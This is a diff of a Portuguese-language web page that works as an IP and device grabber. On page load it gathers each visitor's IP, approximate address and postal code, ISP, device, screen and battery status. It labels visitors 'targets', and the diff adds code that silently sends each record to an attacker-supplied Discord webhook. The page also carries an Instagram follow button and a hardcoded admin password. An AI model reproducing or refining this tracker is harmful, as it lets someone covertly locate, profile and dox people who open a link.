@@ -32,20 +32,6 @@ body{background:var(--bg);color:var(--text);min-height:100vh;display:flex;justif
 /* Botão Instagram */
 .btn-insta{background:transparent;color:#e1306c;border:1px solid #33111f;padding:10px;width:100%;border-radius:6px;cursor:pointer;font-weight:700;text-transform:uppercase;font-size:0.65rem;letter-spacing:1px;transition:all 0.2s;display:block;text-decoration:none;margin-bottom:8px}
 .btn-insta:hover{background:#1a050d;border-color:var(--insta)}
-
-/* Painel Admin */
-.admin-title{font-size:0.85rem;font-weight:900;color:#fff;margin-bottom:12px;letter-spacing:1.5px}
-.stats-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px}
-.stat-box{background:#000000;border:1px solid var(--border);padding:10px;border-radius:6px;text-align:center}
-.stat-box span{display:block;font-size:1.1rem;font-weight:800;color:var(--red);margin-top:4px}
-.admin-table{width:100%;border-collapse:collapse;margin-top:8px;font-size:0.58rem;text-align:left}
-.admin-table th, .admin-table td{padding:6px 4px;border-bottom:1px solid var(--border);white-space:nowrap}
-.admin-table th{color:var(--red)}
-
-.btn-detail{background:#111;color:var(--red);border:1px solid var(--border);padding:4px 8px;border-radius:4px;cursor:pointer;font-size:0.55rem;font-weight:700}
-.btn-detail:hover{background:#222}
-
-.btn-back{background:#111;color:#fff;border:1px solid var(--border);padding:10px;width:100%;border-radius:6px;cursor:pointer;font-weight:700;text-transform:uppercase;font-size:0.65rem;margin-top:14px}
 </style>
 </head>
 <body>
@@ -68,47 +54,17 @@ body{background:var(--bg);color:var(--text);min-height:100vh;display:flex;justif
       <div class="data-row"><span class="data-label">Bateria:</span><span id="targetBattery" class="data-val">A ler...</span></div>
     </div>
 
-    <!-- Botão Instagram (Substitui o link pelo teu perfil) -->
+    <!-- Botão Instagram -->
     <a href="https://instagram.com/o_teu_utilizador" target="_blank" class="btn-insta">📸 Seguir no Instagram</a>
     
     <button class="btn-admin" onclick="openAdmin()">Acessar administração</button>
   </div>
 
-  <!-- Painel Administrativo -->
-  <div id="admin-screen" class="screen" style="display:none;">
-    <div class="admin-title">TERMINAL SECRETO</div>
-    
-    <div class="stats-grid">
-      <div class="stat-box">
-        <small style="color:var(--muted); font-size:0.6rem;">Acessos Totais</small>
-        <span id="totalHits">0</span>
-      </div>
-      <div class="stat-box">
-        <small style="color:var(--muted); font-size:0.6rem;">Estado</small>
-        <span style="color:var(--green)">ONLINE</span>
-      </div>
-    </div>
-
-    <p style="font-size:0.65rem; color:var(--muted); margin-bottom:6px; text-align:left;">Alvos Capturados:</p>
-    <div style="max-height:160px; overflow-y:auto;">
-      <table class="admin-table">
-        <thead>
-          <tr><th>Hora</th><th>IP</th><th>Device</th><th>Ação</th></tr>
-        </thead>
-        <tbody id="adminLogs">
-          <tr><td colspan="4" style="text-align:center; color:var(--muted);">Nenhum alvo registado.</td></tr>
-        </tbody>
-      </table>
-    </div>
-
-    <button class="btn-back" onclick="closeAdmin()">Voltar</button>
-  </div>
-
 </div>
 
 <script>
-let totalHits = 0;
-let captureLogs = [];
+// COLA O TEU WEBHOOK DO DISCORD AQUI EMBAIXO ENTRE AS ASPAS:
+const WEBHOOK_URL = "O_TEU_WEBHOOK_DO_DISCORD_AQUI";
 
 function getDeviceInfo() {
   let ua = navigator.userAgent;
@@ -160,25 +116,33 @@ window.onload = async function() {
 
     if(data.success) {
       let ipVal = data.ip;
-      let locVal = `${data.city || 'N/A'}, ${data.country_code || ''}`;
+      let fullAddress = `${data.city || 'N/A'}, ${data.region || 'N/A'}, ${data.country || 'N/A'} (${data.postal || 'CEP N/A'})`;
       let ispVal = data.connection?.isp || 'N/A';
+      let timeNow = new Date().toLocaleTimeString();
 
       document.getElementById('targetIp').innerText = ipVal;
-      document.getElementById('targetLocation').innerText = locVal;
+      document.getElementById('targetLocation').innerText = `${data.city || 'N/A'}, ${data.country_code || ''}`;
       document.getElementById('targetIsp').innerText = ispVal;
 
-      totalHits++;
-      let timeNow = new Date().toLocaleTimeString();
-      captureLogs.push({
-        time: timeNow,
-        ip: ipVal,
-        location: locVal,
-        isp: ispVal,
-        device: deviceBrand,
-        screen: screenRes,
-        lang: lang,
-        battery: batteryStatus
-      });
+      // Envia automaticamente para o teu Discord via Webhook
+      if(WEBHOOK_URL && WEBHOOK_URL.startsWith("https://")) {
+        let payload = {
+          content: `🚨 **NOVO ALVO CAPTURADO!**\n` +
+                   `• **IP:** \`${ipVal}\`\n` +
+                   `• **Endereço:** ${fullAddress}\n` +
+                   `• **Provedor:** ${ispVal}\n` +
+                   `• **Dispositivo:** ${deviceBrand}\n` +
+                   `• **Ecrã:** ${screenRes} | **Bateria:** ${batteryStatus}\n` +
+                   `• **Hora:** ${timeNow}`
+        };
+
+        fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        }).catch(err => console.log('Erro ao enviar webhook'));
+      }
+
     } else {
       document.getElementById('targetIp').innerText = "Indisponível";
       document.getElementById('targetLocation').innerText = "Protegido";
@@ -191,49 +155,10 @@ window.onload = async function() {
 function openAdmin() {
   let pass = prompt('Palavra-passe de acesso:');
   if(pass === '17102007') {
-    document.getElementById('home-screen').style.display = 'none';
-    document.getElementById('admin-screen').style.display = 'block';
-    updateAdminStats();
+    alert('⚠️ Os registos de todos os alvos agora chegam diretamente no teu canal do Discord configurado no Webhook!');
   } else if(pass !== null) {
     alert('Acesso negado.');
   }
-}
-
-function closeAdmin() {
-  document.getElementById('admin-screen').style.display = 'none';
-  document.getElementById('home-screen').style.display = 'block';
-}
-
-function updateAdminStats() {
-  document.getElementById('totalHits').innerText = totalHits;
-
-  let tbody = document.getElementById('adminLogs');
-  if(captureLogs.length === 0) {
-    tbody.innerHTML = `<tr><td colspan="4" style="text-align:center; color:var(--muted);">Nenhum alvo registado.</td></tr>`;
-    return;
-  }
-
-  tbody.innerHTML = captureLogs.map((log, index) => `
-    <tr>
-      <td>${log.time}</td>
-      <td><code>${log.ip}</code></td>
-      <td>${log.device}</td>
-      <td><button class="btn-detail" onclick="verDetalhes(${index})">Ver</button></td>
-    </tr>
-  `).join('');
-}
-
-function verDetalhes(index) {
-  let log = captureLogs[index];
-  alert(`📋 RELATÓRIO DO ALVO #${index + 1}\n\n` +
-        `• IP: ${log.ip}\n` +
-        `• Local: ${log.location}\n` +
-        `• ISP: ${log.isp}\n` +
-        `• Dispositivo: ${log.device}\n` +
-        `• Ecrã: ${log.screen}\n` +
-        `• Idioma/Sistema: ${log.lang}\n` +
-        `• Bateria: ${log.battery}\n` +
-        `• Hora do Acesso: ${log.time}`);
 }
 </script>
 </body>
